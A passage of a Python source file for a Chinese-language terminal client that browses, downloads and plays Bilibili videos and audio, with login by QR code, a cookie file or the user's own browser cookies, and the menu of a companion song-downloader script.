    tot = d.get("numPages") or d.get("pages") or 1
    for v in d.get("result", []):
      if t == "video": out.append({"type": "video", "title": clean(v.get("title","")), "id": v.get("bvid",""), "author": clean(v.get("author","")), "play": v.get("play",0), "like": v.get("like",0), "danmaku": v.get("video_review",0), "favorite": v.get("favorites",0), "duration": v.get("duration",""), "pubdate": v.get("pubdate",0), "desc": v.get("description","") or v.get("desc",""), "typename": v.get("typename",""), "pic": v.get("pic","")})
      elif t == "bili_user": out.append({"type": "user", "title": clean(v.get("uname","")), "id": v.get("mid",""), "usign": v.get("usign",""), "fans": v.get("fans",0), "videos": v.get("videos",0), "level": v.get("level",0), "pic": v.get("upic","")})
      else: out.append({"type": t, "title": clean(v.get("title") or v.get("uname","")), "id": v.get("bvid","") or v.get("mid",""), "author": clean(v.get("author","")), "play": v.get("play",0), "pic": v.get("pic","")})
    return out, tot

  def do_search(pg=1, force=False):
    if not S["q"]: return (False, "请输入关键词")
    client.fetch_ps = cur_ps()
    t = TYPE_VALUES[S["ti"]]; k = f"search_{t}_{S['q']}_{pg}_{cur_ps()}"
    if not force:
      c = cl(k)
      if c: S["items"], S["tp"], S["mode"], S["pg"], S["cur"], S["off"], S["hit"] = c["items"], c["total"], "search", pg, 0, 0, True; return (True, f"[缓存] {len(c['items'])} 条")
    S["load"] = True
    try:
      res = client.do_search(S["q"], pn=pg, idx=S["ti"]); items, tot = parse(res, t)
      S["items"], S["mode"], S["cur"], S["off"], S["pg"], S["tp"], S["hit"] = items, "search", 0, 0, pg, tot, False
      cs(k, {"items": items, "total": tot})
      S["load"] = False
      return (True, f"找到 {len(items)} 条 (第{pg}/{tot}页)")
    except Exception as e:
      S["load"] = False
      return (False, f"搜索失败: {e}")

  def load_list(fn, mode, pg=1, force=False, add=False):
    client.fetch_ps = cur_ps()
    k = f"{mode}_{pg}_{cur_ps()}"
    if not force and not add:
      c = cl(k)
      if c: S["items"], S["mode"], S["pg"], S["tp"], S["cur"], S["off"], S["hit"] = c, mode, pg, 1, 0, 0, True; return (True, f"[缓存] {len(c)} 条")
    S["load"] = True
    try:
      res = fn(pn=pg); d = res.get("data") or {}; items = []
      for v in d.get("list", []) or d.get("item", []): items.append({"type": "video", "title": clean(v.get("title","")), "id": v.get("bvid",""), "author": clean(v.get("owner",{}).get("name","")), "play": v.get("stat",{}).get("view",0), "like": v.get("stat",{}).get("like",0), "danmaku": v.get("stat",{}).get("danmaku",0), "favorite": v.get("stat",{}).get("favorite",0), "duration": v.get("duration",""), "pubdate": v.get("pubdate",0), "desc": v.get("desc",""), "typename": v.get("tname",""), "pic": v.get("pic","")})
      if add: S["items"] = S["items"] + items
      else: S["items"], S["mode"], S["cur"], S["off"], S["pg"], S["tp"], S["hit"] = items, mode, 0, 0, pg, 1, False
      cs(k, S["items"] if add else items)
      S["load"] = False
      return (True, f"{mode} {len(items)} 条")
    except Exception as e:
      S["load"] = False
      return (False, f"加载失败: {e}")

  def load_pop(pg=1, f=False, a=False): return load_list(client.get_pop, "popular", pg, f, a)
  def load_rec(pg=1, f=False, a=False): return load_list(client.get_recommend, "recommend", pg, f, a)
  def load_his(pg=1, f=False, a=False): return load_list(client.get_history, "history", pg, f, a)
  def load_tov(pg=1, f=False, a=False): return load_list(client.get_toview, "toview", pg, f, a)

  def upd_login():
    try: S["login"] = "已登录" if client.check_login() else "未登录"
    except Exception: S["login"] = "未知"

  def do_login_qr():
    curses.endwin()
    print("即将扫码登录...")
    try:
      ok = client.login_by_qr(path=COOKIE_PATH)
      S["login"] = "已登录" if ok else "未登录"
      r = (True, "登录成功") if ok else (False, "登录失败")
    except KeyboardInterrupt: r = (False, "已取消")
    except Exception as e: r = (False, f"登录失败: {e}")
    input("按回车继续...")
    curses.doupdate(); upd_login()
    return r

  def do_cookies():
    try:
      if client.load_cookies(COOKIE_PATH): upd_login(); return (True, f"已加载 {COOKIE_PATH}")
      return (False, f"加载失败: {COOKIE_PATH}")
    except Exception as e: return (False, f"加载失败: {e}")

  def do_browser(idx):
    if idx < 0: return (False, "未选浏览器")
    curses.endwin()
    print(f"正在从 {BROWSERS[idx]} 读取 cookies...")
    try:
      import browser_cookie3
    except ModuleNotFoundError:
      print("正在安装 browser_cookie3...")
      subprocess.run([sys.executable, "-m", "pip", "install", "browser_cookie3", "pycryptodome", "keyring"], check=True)
      import browser_cookie3
    try:
      fn = getattr(browser_cookie3, BROWSERS[idx])
      cj = fn(domain_name=".bilibili.com")
      client.session.cookies.update(cj); client.cookies = client.session.cookies
      upd_login(); r = (True, "读取成功")
    except KeyboardInterrupt: r = (False, "已取消")
    except Exception as e: r = (False, f"读取失败: {e}")
    input("按回车继续...")
    curses.doupdate()
    return r

  def do_view_cover(it):
    if not it or not it.get("pic"): return (False, "无封面")
    url = it["pic"]
    if url.startswith("//"): url = "https:" + url
    h = _md5(it.get("id",""))
    ext = os.path.splitext(url)[1] or ".jpg"
    f = os.path.join(CACHE_DIR, f"cover_{h}{ext}")
    if not os.path.exists(f):
      try:
        r = client.session.get(url, timeout=10)
        if r.status_code == 200: open(f, "wb").write(r.content)
        else: return (False, f"下载封面失败: {r.status_code}")
      except Exception as e: return (False, f"下载封面失败: {e}")
    try:
      if "com.termux" in os.environ.get("PREFIX", ""): subprocess.run(["termux-open", f])
      elif os.name == "nt": os.startfile(f)
      elif sys.platform == "darwin": subprocess.run(["open", f])
      else: subprocess.run(["xdg-open", f])
      return (True, "已打开")
    except Exception as e: return (False, f"打开失败: {e}")
    
  def do_download(it, mode, qn, page=1):
    if not it or it.get("type") != "video": return (False, "无选中项")
    curses.endwin()
    print(f"开始下载: {it['title']}")
    try:
      client.download_video(it["id"], save_path=MUSIC_DIR, page=page, mode=mode, qn=qn)
      r = (True, "下载完成")
    except KeyboardInterrupt:
      curses.doupdate(); return (False, "已取消")
    except Exception as e:
      curses.doupdate(); return (False, f"下载失败: {e}")
    # 下载完，找最新下载的音频文件转 MP3
    if mode in ("audio", "both"):
      latest = None; latest_mtime = 0
      for name in os.listdir(MUSIC_DIR):
        if name.endswith(".m4a"):
          p = os.path.join(MUSIC_DIR, name)
          mt = os.path.getmtime(p)
          if mt > latest_mtime: latest_mtime = mt; latest = p
      if latest:
        mp3 = os.path.splitext(latest)[0] + ".mp3"
        if not os.path.exists(mp3):
          print("正在转 MP3...")
          try:
            subprocess.run(["ffmpeg", "-y", "-i", latest, "-codec:a", "libmp3lame", "-q:a", "2", mp3], check=True)
            os.remove(latest)
            r = (True, "下载完成，已转 MP3")
          except KeyboardInterrupt:
            curses.doupdate(); return (False, "已取消")
          except subprocess.CalledProcessError:
            r = (True, "下载完成，但转 MP3 失败")
          except Exception:
            r = (True, "下载完成，但转 MP3 失败")
    input("按回车继续...")
    curses.doupdate()
    return r
    
  def do_play(it, ss):
    if not it or it.get("type") != "video": return (False, "无选中项")
    h = _md5(it["id"])
    mp3 = os.path.join(CACHE_DIR, f"{h}.mp3")
    if not os.path.exists(mp3):
      curses.endwin()
      print(f"正在下载音频: {it['title']}")
      try: client.download_video(it["id"], save_path=CACHE_DIR, page=PLAY_PAGE, mode="audio", qn=PLAY_QN)
      except KeyboardInterrupt:
        curses.doupdate(); return (False, "已取消")
      except Exception as e:
        curses.doupdate(); return (False, f"下载音频失败: {e}")
      found = None
      for name in os.listdir(CACHE_DIR):
        if name.endswith(".m4a"): found = os.path.join(CACHE_DIR, name); break
      if not found:
        curses.doupdate(); return (False, "未找到下载的音频")
      print("正在转 MP3...")
      try:
        subprocess.run(["ffmpeg", "-y", "-i", found, "-codec:a", "libmp3lame", "-q:a", "2", mp3], check=True)
        os.remove(found)
      except KeyboardInterrupt:
        curses.doupdate(); return (False, "已取消")
      except subprocess.CalledProcessError:
        curses.doupdate(); return (False, "转 MP3 失败，请确认装了 ffmpeg")
      except Exception as e:
        curses.doupdate(); return (False, f"转 MP3 失败: {e}")
      curses.doupdate()
    if not os.path.exists(mp3): return (False, "MP3 文件不存在")
    if player:
      try: player.play(Path(mp3)); S["playing"] = True; curses.clear(); return (True, "播放中")
      except Exception as e: return (False, f"播放失败: {e}")
    return (False, "无播放器")

  def dx_msg(ss, bg, title, text):
    d = Dialog(title, text.split("\n"), [{"label": "确定", "action": "ok"}], kind="text")
    d.run(ss, bg)

  def dx_browser(ss, bg):
    d = Dialog("选择浏览器", BROWSERS, [{"label": "确定", "action": "ok"}, {"label": "取消", "action": "cancel"}])
    r = d.run(ss, bg)
    if r and r["action"] == "ok": return r["cursor"]
    return -1

  def dx_login(ss, bg):
    d = Dialog("登录", ["扫码登录", "加载 cookies", "浏览器 cookies"], [{"label": "确定", "action": "ok"}, {"label": "取消", "action": "cancel"}])
    r = d.run(ss, bg)
    if not r or r["action"] != "ok": return
    if r["cursor"] == 0: ok, msg = do_login_qr(); dx_msg(ss, bg, "登录", msg)
    elif r["cursor"] == 1: ok, msg = do_cookies(); dx_msg(ss, bg, "登录", msg)
    elif r["cursor"] == 2:
      idx = dx_browser(ss, bg)
      if idx >= 0: ok, msg = do_browser(idx); dx_msg(ss, bg, "登录", msg)

  def dx_download(ss, bg, it):
    if not it or it.get("type") != "video": return
    items = ["音频", "视频", "音视频"] + [f"{name}({'VIP' if qn in NEED_VIP_QN else ('登录' if qn in NEED_LOGIN_QN else '免费')})" for name, qn in QUALITY]
    checks = [False]*len(items)
    checks[{"audio":0, "video":1, "both":2}.get(DLG_MODE, 0)] = True
    for i, (_, qn) in enumerate(QUALITY):
      if qn == DLG_QN: checks[3 + i] = True; break
    d = Dialog("下载 - 类型/画质", items, [{"label": "下一步", "action": "ok"}, {"label": "取消", "action": "cancel"}], kind="check", checks=checks)
    r = d.run(ss, bg)
    if not r or r["action"] != "ok": return
    mode = "audio" if r["checks"][0] else ("video" if r["checks"][1] else "both")
    qn = DLG_QN
    for i in range(3, len(r["checks"])):
      if r["checks"][i]: qn = QUALITY[i-3][1]; break
    d2 = Dialog("下载 - 分P", [f"P: {DLG_PAGE}"], [{"label": "下载", "action": "ok"}, {"label": "取消", "action": "cancel"}], kind="form")
    r2 = d2.run(ss, bg)
    if not r2 or r2["action"] != "ok": return
    page = DLG_PAGE
    try: page = int(d2.items[0].rsplit(":", 1)[1].strip())
    except Exception: pass
    ok, msg = do_download(it, mode, qn, page)
    dx_msg(ss, bg, "下载结果", msg)

  def dx_settings(ss, bg):
    nonlocal COOKIE_PATH, CACHE_DIR, HTTP_PROXY, DOWNLOAD_MODE, FETCH_PS, USE_TERM_H, BROWSER_IDX, PLAY_QN, PLAY_PAGE
    items = [f"COOKIE_PATH: {COOKIE_PATH}", f"CACHE_DIR: {CACHE_DIR}", f"HTTP_PROXY: {HTTP_PROXY or ''}", f"download_mode: {DOWNLOAD_MODE}", f"fetch_ps: {FETCH_PS}", f"use_term_height: {'yes' if USE_TERM_H else 'no'}", f"browser: {BROWSERS[BROWSER_IDX] if BROWSER_IDX >= 0 else '未选'}", f"play_qn: {PLAY_QN}", f"play_page: {PLAY_PAGE}"]
    d = Dialog("设置", items, [{"label": "保存", "action": "ok"}, {"label": "取消", "action": "cancel"}], kind="form")
    r = d.run(ss, bg)
    if not r or r["action"] != "ok": return
    def gv(i): return d.items[i].rsplit(":", 1)[1].strip()
    COOKIE_PATH = gv(0) or COOKIE_PATH; CACHE_DIR = gv(1) or CACHE_DIR
    HTTP_PROXY = gv(2) or None; DOWNLOAD_MODE = gv(3) or DOWNLOAD_MODE
    try: FETCH_PS = int(gv(4) or FETCH_PS)
    except Exception: pass
    USE_TERM_H = gv(5).lower() in ("yes", "1", "true")
    try: PLAY_QN = int(gv(7) or PLAY_QN)
    except Exception: pass
    try: PLAY_PAGE = int(gv(8) or PLAY_PAGE)
    except Exception: pass
    save_conf({"COOKIE_PATH": COOKIE_PATH, "CACHE_DIR": CACHE_DIR, "HTTP_PROXY": HTTP_PROXY or "", "download_mode": DOWNLOAD_MODE, "fetch_ps": str(FETCH_PS), "use_term_height": "1" if USE_TERM_H else "0", "browser_idx": str(BROWSER_IDX), "dlg_mode": DLG_MODE, "dlg_qn": str(DLG_QN), "dlg_page": str(DLG_PAGE), "play_qn": str(PLAY_QN), "play_page": str(PLAY_PAGE)})

  def dx_help(ss, bg):
    lines = ["Enter      播放", "i /        搜索", "Tab        切换类型", "↑↓         移动", "←→         进度/切类型", "+ -        音量", "[ ]        翻页", "L          登录", "P          热门", "R          推荐", "H          历史", "W          稍后", ",          设置", "?          帮助", "Q          退出"]
    d = Dialog("帮助", lines, [{"label": "关闭", "action": "ok"}], kind="text")
    d.run(ss, bg)

  def draw_detail(ss, top, left, h, w, it):
    iw = w - 4; y = top + 2; my = top + h - 3
    def put(l, v, c=8):
      nonlocal y
      if y >= my: return
      sa(ss, y, left + 2, tr(f" {l}: {v}", iw), curses.color_pair(c)); y += 1
    if not it:
      sa(ss, y, left + 2, "  (无选中项)", curses.color_pair(8)); return
    t = it.get("type","")
    if t == "video":
      put("标题", it.get("title",""), 9); put("BV号", it.get("id","")); put("UP主", it.get("author","")); put("分区", it.get("typename","")); put("播放", it.get("play",0)); put("点赞", it.get("like",0)); put("弹幕", it.get("danmaku",0)); put("收藏", it.get("favorite",0)); put("时长", it.get("duration",""))
    elif t == "user":
      put("用户名", it.get("title",""), 9); put("UID", str(it.get("id",""))); put("粉丝", it.get("fans",0)); put("视频", it.get("videos",0)); put("等级", f"Lv{it.get('level',0)}"); put("签名", it.get("usign",""))
    else:
      put("标题", it.get("title",""), 9); put("ID", str(it.get("id",""))); put("作者", it.get("author","")); put("播放", it.get("play",0))

  def draw(ss):
    ss.erase()
    h, w = ss.getmaxyx()
    if h < 12 or w < 50:
      sa(ss, 0, 0, "终端太小", curses.color_pair(10)); ss.refresh(); return
    now = datetime.now().strftime("%H:%M:%S"); cm = " 💾" if S["hit"] else ""
    left_t = f" ✦ BiliTui ✦ {S['mode']} P{S['pg']}/{S['tp']}{cm} "
    right_t = f" {S['login']} ✦ {now} "
    sa(ss, 0, 0, " "*(w-1), curses.color_pair(1))
    sa(ss, 0, 0, tr(left_t, w-1), curses.color_pair(1) | curses.A_BOLD)
    sa(ss, 0, max(0, w - dw(right_t) - 1), tr(right_t, w-1), curses.color_pair(1) | curses.A_BOLD)
    if S["edit"]: a = curses.color_pair(4) | curses.A_BOLD; hint = " (Enter提交 Esc取消)"
    else: a = curses.color_pair(3); hint = ""
    sa(ss, 2, 0, f"  搜索: {S['q']}_{hint}".ljust(w-1), a)
    login_btn = " [ 登录 ] "; lx = w - dw(login_btn) - 2; S["lpos"] = (lx, lx + dw(login_btn))
    la = curses.color_pair(1) | curses.A_BOLD if S["login"] != "已登录" else curses.color_pair(8) | curses.A_DIM
    sa(ss, 2, lx, login_btn, la)
    if S["mode"] == "search":
      tl = "  ".join((f"◆{t}◆" if i == S["ti"] else f" {t} ") for i, t in enumerate(TYPES))
      st = cx(tl, w); pos = []; p = st
      for i, t in enumerate(TYPES):
        seg = f"◆{t}◆" if i == S["ti"] else f" {t} "
        pos.append((p, p + dw(seg), i)); p += dw(seg) + 2
      S["tpos"] = pos
      if S["ft"]: sa(ss, 4, 0, " "*(w-1), curses.color_pair(5))
      sa(ss, 4, st, tl, curses.color_pair(5 if S["ft"] else 6))
    else: S["tpos"] = []
    has_player = player is not None
    pt = 6
    pb = h - (5 if has_player else 2)
    ph = pb - pt + 1
    wl = int(w * 0.55); wr = w - wl
    box(ss, pt, 0, ph, wl, 2, f"列表 [{len(S['items'])}] P{S['pg']}/{S['tp']}")
    box(ss, pt, wl, ph, wr, 2, "详情")
    lh = ph - 3
    if S["cur"] < S["off"]: S["off"] = S["cur"]
    if S["cur"] >= S["off"] + lh: S["off"] = S["cur"] - lh + 1
    for i in range(lh):
      idx = S["off"] + i
      if idx >= len(S["items"]): break
      it = S["items"][idx]; tx = tr(f" {idx+1:>3}. {it['title']} ", wl-4); tx += " " * max(0, (wl-4) - dw(tx))
      sa(ss, pt+1+i, 1, tx, curses.color_pair(7) | curses.A_BOLD if idx == S["cur"] else curses.color_pair(8))
    by = pt + ph - 2
    S["bprev"] = (0,0); S["bnext"] = (0,0); S["mpos"] = (0,0)
    if S["mode"] == "search":
      cp_ok = S["pg"] > 1; cn_ok = S["pg"] < S["tp"]
      bp, bn, gap = " ◀ 上一页 ", " 下一页 ▶ ", "   "
      tw = dw(bp) + dw(gap) + dw(bn); bx = max(1, (wl - tw) // 2)
      S["bprev"] = (bx, bx+dw(bp)); S["bnext"] = (bx+dw(bp)+dw(gap), bx+tw)
      sa(ss, by, bx, bp, curses.color_pair(4) | curses.A_BOLD if cp_ok else curses.color_pair(8) | curses.A_DIM)
      sa(ss, by, bx+dw(bp), gap, curses.color_pair(8))
      sa(ss, by, bx+dw(bp)+dw(gap), bn, curses.color_pair(4) | curses.A_BOLD if cn_ok else curses.color_pair(8) | curses.A_DIM)
    elif S["items"]:
      more = " [ 加载中... ] " if S["loading_more"] else " [ 加载更多 ] "
      mx_ = (wl - dw(more)) // 2
      S["mpos"] = (mx_, mx_ + dw(more))
      sa(ss, by, mx_, more, curses.color_pair(4) | curses.A_BOLD)
    ci = S["items"][S["cur"]] if 0 <= S["cur"] < len(S["items"]) else None
    draw_detail(ss, pt, wl, ph, wr, ci)
    dby = pt + ph - 2
    btns = [("下载", "download"), ("封面", "cover"), ("设置", "settings")]
    bw = max(6, (wr - 4) // 3 - 2)
    dbx = wl + max(1, (wr - (bw * 3 + 4)) // 2)
    S["dbtn"] = {}
    for label, act in btns:
      label = f" {label} "
      sa(ss, dby, dbx, label.ljust(bw), curses.color_pair(4) | curses.A_BOLD)
      S["dbtn"][act] = (dbx, dbx + bw)
      dbx += bw + 2
    if has_player:
      py = h - 4
      try: now_p, dur = player.get_play_progress() if player.is_busy() else ("00:00", "00:00")
      except Exception: now_p, dur = "00:00", "00:00"
      pct = 0
      try: pct = int(player.progress() or 0)
      except Exception: pass
      volw = max(5, int(w * 0.15)); vf = int(volw * S["vol"])
      vbar = "█" * vf + "░" * (volw - vf)
      line1 = f" 音量: [{vbar}] {int(S['vol']*100):>3}%   共 {len(S['items'])} 首   {'播放中' if S['playing'] else '已暂停'}"
      sa(ss, py, 0, tr(line1, w-1).ljust(w-1), curses.color_pair(9))
      S["vbar"] = (7, 7 + volw); S["vbar_row"] = py
      time_str = f"{now_p}/{dur}"; pct_str = f"{pct:>3}%"
      inner = max(5, w - dw(time_str) - dw(pct_str) - 5)
      filled = int(inner * pct / 100)
      bar = "=" * filled + (">" if filled < inner else "") + " " * max(0, inner - filled - (1 if filled < inner else 0))
      line2 = f"{time_str} [{bar}] {pct_str}"
      sa(ss, py+1, 0, tr(line2, w-1), curses.color_pair(8) | curses.A_BOLD)
      S["pbar"] = (dw(time_str) + 1, min(w - 1, dw(time_str) + 1 + inner)); S["pbar_row"] = py + 1
    if S["msg"]:
      sa(ss, h-2, 0, tr(f" {S['msg']}", w-1).ljust(w-1), curses.color_pair(10))
    help_line = " Enter:播放  i:搜索  Tab:类型  ↑↓:移动  ←→:进度  +-:音量  ?:帮助  Q:退出 "
    sa(ss, h-1, 0, help_line.ljust(w-1), curses.color_pair(11))
    ss.refresh()

  def bg(ss): draw(ss)

  def _do_volume_at(mx):
    v1, v2 = S.get("vbar", (0,0))
    if v1 <= mx <= v2:
      vol = max(0.0, min(1.0, (mx - v1) / max(1, v2 - v1)))
      S["vol"] = vol
      try:
        import pygame
        pygame.mixer.music.set_volume(vol)
      except Exception: pass

  def _do_seek_at(mx):
    p1, p2 = S.get("pbar", (0,0))
    if p1 <= mx <= p2 and player:
      try:
        import pygame
        if pygame.mixer.music.get_busy():
          dur = float(player.get_duration() or 0)
          if dur > 0:
            target = (mx - p1) / max(1, p2 - p1) * dur
            if hasattr(player, "seek_to"): player.seek_to(target)
      except Exception: pass

  def handle_key(ss, key):
    if key == curses.KEY_MOUSE:
      try: _, mx, my, _, bs = curses.getmouse()
      except Exception: return
      h, w = ss.getmaxyx()
      pt = 6; pb = h - (5 if player else 2); ph = pb - pt + 1; wl = int(w * 0.55); by = pt + ph - 2
      # 拖动超时清
      if S.get("dragging") and time.time() - S.get("drag_time", 0) > 0.5:
        S["dragging"] = None
      # 拖动中，只在对应行才继续
      if S.get("dragging") == "progress":
        if my == S.get("pbar_row", -1):
          _do_seek_at(mx); S["drag_time"] = time.time()
        return
      if S.get("dragging") == "volume":
        if my == S.get("vbar_row", -1):
          _do_volume_at(mx); S["drag_time"] = time.time()
        return
      # 按下：进度条 / 音量条
      if bs & curses.BUTTON1_PRESSED:
        if my == S.get("pbar_row", -1):
          p1, p2 = S.get("pbar", (0,0))
          if p1 <= mx <= p2:
            S["dragging"] = "progress"; S["drag_time"] = time.time()
            _do_seek_at(mx); return
        if my == S.get("vbar_row", -1):
          v1, v2 = S.get("vbar", (0,0))
          if v1 <= mx <= v2:
            S["dragging"] = "volume"; S["drag_time"] = time.time()
            _do_volume_at(mx); return
        # 按在别处，清拖动
        S["dragging"] = None
      if bs & (curses.BUTTON1_RELEASED | curses.BUTTON1_CLICKED):
        S["dragging"] = None
      # 滚轮
      if bs & curses.BUTTON4_PRESSED:
        if S["cur"] > 0: S["cur"] -= 1
        return
      if bs & curses.BUTTON5_PRESSED:
        if S["cur"] < len(S["items"]) - 1: S["cur"] += 1
        return
      # 普通点击
      if my == 2:
        lx, lx2 = S.get("lpos", (0,0))
        if lx <= mx < lx2: dx_login(ss, bg); return
        S["edit"] = True; return
      if my == 4 and S["mode"] == "search":
        S["ft"] = True
        for s, e, i in S.get("tpos", []):
          if s <= mx < e:
            if S["ti"] != i: S["ti"] = i; do_search(1) if S["q"] else None
            break
        return
      for act, (b1, b2) in S.get("dbtn", {}).items():
        if my == by and b1 <= mx < b2:
          ci = S["items"][S["cur"]] if 0 <= S["cur"] < len(S["items"]) else None
          if act == "download": dx_download(ss, bg, ci)
          elif act == "cover":
            ok, msg = do_view_cover(ci); dx_msg(ss, bg, "查看封面", msg)
          elif act == "settings": dx_settings(ss, bg)
          return
      if my == by:
        p1, p2 = S.get("bprev", (0,0)); n1, n2 = S.get("bnext", (0,0))
        if p1 <= mx < p2: pp(); return
        if n1 <= mx < n2: np(); return
        m1, m2 = S.get("mpos", (0,0))
        if m1 <= mx < m2:
          S["loading_more"] = True
          S["temp_ps"] = (S["temp_ps"] or cur_ps()) + 5
          {"popular": load_pop, "recommend": load_rec, "history": load_his, "toview": load_tov}.get(S["mode"], load_pop)(1, False, True)
          S["loading_more"] = False
          return
      if pt+1 <= my < by and 1 <= mx < wl-1:
        idx = S["off"] + (my - pt - 1)
        if 0 <= idx < len(S["items"]):
          now = time.time()
          if now - S["last_click"] < 0.1: return
          if S["last_idx"] == idx and now - S["last_click"] < 0.8:
            ok, msg = do_play(S["items"][idx], ss); S["last_idx"] = -1
            if not ok: dx_msg(ss, bg, "播放", msg)
          else:
            S["last_click"] = now; S["last_idx"] = idx
          S["cur"] = idx; S["ft"] = False
        return
      return
    if S["edit"]:
      if isinstance(key, str):
        if key in ("\n", "\r"): S["edit"] = False; ok, msg = do_search(1); (None if ok else dx_msg(ss, bg, "搜索", msg))
        elif key == "\x1b": S["edit"] = False
        elif key in ("\x7f", "\b"): S["q"] = S["q"][:-1]
        elif key == "\t": S["edit"] = False
        elif ord(key) >= 32: S["q"] += key
      elif key == curses.KEY_BACKSPACE: S["q"] = S["q"][:-1]
      return
    if key == "\t": S["ft"] = not S["ft"]; return
    if key == curses.KEY_UP:
      if S["cur"] > 0: S["cur"] -= 1
    elif key == curses.KEY_DOWN:
      if S["cur"] < len(S["items"]) - 1: S["cur"] += 1
    elif key == curses.KEY_LEFT:
      if S["ft"]: S["ti"] = (S["ti"]-1) % len(TYPES)
      elif player:
        try: player.Jump("-10")
        except Exception: pass
    elif key == curses.KEY_RIGHT:
      if S["ft"]: S["ti"] = (S["ti"]+1) % len(TYPES)
      elif player:
        try: player.Jump("+10")
        except Exception: pass
    elif key in ("\n", "\r"):
      if S["ft"]: do_search(1) if S["q"] else None; S["ft"] = False
      elif S["items"]:
        ok, msg = do_play(S["items"][S["cur"]], ss)
        if not ok: dx_msg(ss, bg, "播放", msg)
    elif key in ("i", "I", "/"): S["edit"] = True
    elif key in ("q", "Q"): S["run"] = False
    elif key in ("l", "L"): dx_login(ss, bg)
    elif key in ("c", "C"): ok, msg = do_cookies(); (None if ok else dx_msg(ss, bg, "登录", msg))
    elif key in ("p", "P"): load_pop(1)
    elif key in ("r", "R"): load_rec(1)
    elif key in ("h", "H"): load_his(1)
    elif key in ("w", "W"): load_tov(1)
    elif key == "[": pp()
    elif key == "]": np()
    elif key == ",": dx_settings(ss, bg)
    elif key == "?": dx_help(ss, bg)
    elif key in ("s", "S"): do_search(S["pg"], True) if S["mode"] == "search" else (load_pop(S["pg"], True) if S["mode"] == "popular" else (load_rec(S["pg"], True) if S["mode"] == "recommend" else (load_his(S["pg"], True) if S["mode"] == "history" else load_tov(S["pg"], True))))
    elif key == " " and player: player.toggle_pause(); S["playing"] = not S["playing"]
    elif key == "+" and player:
      player.volume_up(); S["vol"] = min(1.0, S["vol"] + 0.05)
    elif key == "-" and player:
      player.volume_down(); S["vol"] = max(0.0, S["vol"] - 0.05)

  def np():
    if S["mode"] == "search" and S["pg"] < S["tp"]: do_search(S["pg"]+1)
  def pp():
    if S["mode"] == "search" and S["pg"] > 1: do_search(S["pg"]-1)

  def main(ss):
    curses.start_color(); curses.use_default_colors()
    for i, (f, b) in enumerate([(curses.COLOR_BLACK, curses.COLOR_CYAN), (curses.COLOR_CYAN, -1), (curses.COLOR_YELLOW, -1), (curses.COLOR_BLACK, curses.COLOR_YELLOW), (curses.COLOR_BLACK, curses.COLOR_MAGENTA), (curses.COLOR_MAGENTA, -1), (curses.COLOR_BLACK, curses.COLOR_GREEN), (curses.COLOR_WHITE, -1), (curses.COLOR_CYAN, -1), (curses.COLOR_YELLOW, -1), (curses.COLOR_BLUE, -1), (curses.COLOR_RED, -1), (curses.COLOR_BLACK, curses.COLOR_RED)]): curses.init_pair(i+1, f, b)
    curses.curs_set(0); ss.keypad(True)
    curses.mousemask(curses.ALL_MOUSE_EVENTS | curses.REPORT_MOUSE_POSITION); curses.mouseinterval(0)
    upd_login()
    load_pop(1)
    while S["run"]:
      draw(ss)
      try: ss.timeout(300 if player and S["playing"] else -1); key = ss.get_wch()
      except curses.error: continue
      except KeyboardInterrupt: break
      handle_key(ss, key)

  try:
    curses.wrapper(main)
  except Exception:
    try: curses.endwin()
    except Exception: pass
    raise
# =============================  END ==============================
__bill_term = None
def main():
   global __bill_term
   mun = 30
   global USD_MOD
   Logo = ["\033[36m\033[H\033[2J\033[3J","███╗   ███╗██╗   ██╗███████╗██╗ ██████╗","████╗ ████║██║   ██║██╔════╝██║██╔════╝","██╔████╔██║██║   ██║███████╗██║██║","██║╚██╔╝██║██║   ██║╚════██║██║██║","██║ ╚═╝ ██║╚██████╔╝███████║██║╚██████╗","╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝ ╚═════╝","\033[35m","██████╗  ██████╗ ██╗    ██╗███╗   ██╗","██╔══██╗██╔═══██╗██║    ██║████╗  ██║","██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║","██║  ██║██║   ██║██║███╗██║██║╚██╗██║","██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║","╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝","\033[34m","██╗      ██████╗  █████╗ ██████╗","██║     ██╔═══██╗██╔══██╗██╔══██╗","██║     ██║   ██║███████║██║  ██║","██║     ██║   ██║██╔══██║██║  ██║","███████╗╚██████╔╝██║  ██║██████╔╝","╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝","\033[0m"]
   width = shutil.get_terminal_size().columns
   for _print in Logo:
     time.sleep(print_sleep)
     wide = len(_print)
     if wide < width: wide = (width  - wide) // 2
     else: wide = 0
     print(" "*wide,_print)
   while True:
      print("─=≡Σ((( つ•̀ω•́)つ" , "  "*((width-50)//2) , f"\033[1;32m作者: \033[97m{Author_name}\033[0m")
      print("\n\033[1;37;44m 欢迎使用歌曲下载器 \033[0m")
      print("  \033[1;37m请输入序号以选择功能:\033[0m")
      print("  \033[1;33m1)\033[0m \033[1;32m获取网络热门歌曲\033[0m")
      print("  \033[1;33m2)\033[0m \033[1;34m搜索你喜欢听的歌曲\033[0m")
      print("  \033[1;33m3)\033[0m \033[1;35m修改搜索阈值\033[0m")
      print("  \033[1;33m4)\033[0m \033[1;31m启动播放器\033[0m")
      print("  \033[1;33m5)\033[0m \033[1;97m启用GUI(实验性)\033[0m")
      print("  \033[1;33m6)\033[0m \033[;1;38;5;161;236m观摩B站 <TUI>\033[0m")
      print("  \033[1;33m7)\033[0m \033[1;36m退出脚本\033[0m\n\n")
      print("\r\033[K\033[1;37m┌─ 请输入功能序号 ──────────────┐\033[0m")
      choices = input(f"\r\033[K\033[1;37m└─▶ \033[0m")
      if choices == "1":
        get_music("musicChart",'null',30)
      elif choices == "2":
        singer = input(f"\r\033[K\033[1;33;4m 请输入歌曲名称 \033[0m\033[1;37m : \033[0m")
        if singer == "": print("\r\033[K输入不能为空....")
        else: get_music("search",singer,mun)
      elif choices == "3":
        tmp = input(f"\r\033[K\033[1;35;4m输入搜索阈值[当前数值: {mun}]\033[0m\033[1;37m : \033[0m")
        if f"{tmp}".isnumeric(): mun = int(tmp)
        else: print("\r\033[K输入的数值不标准")
      elif choices == "4":
        player()
      elif choices == "5":
        play_gui()
      elif choices == "6":
        if not __bill_term:
         def _tw(): return shutil.get_terminal_size().columns
         def dw(s): return sum(2 if ord(c) > 0x2E80 else 1 for c in s)
         def _p(text, color=36):
          pad = max(0, (_tw() - dw(text)) // 2)
          print("\033[%dm%s%s\033[0m" % (color, " " * pad, text))
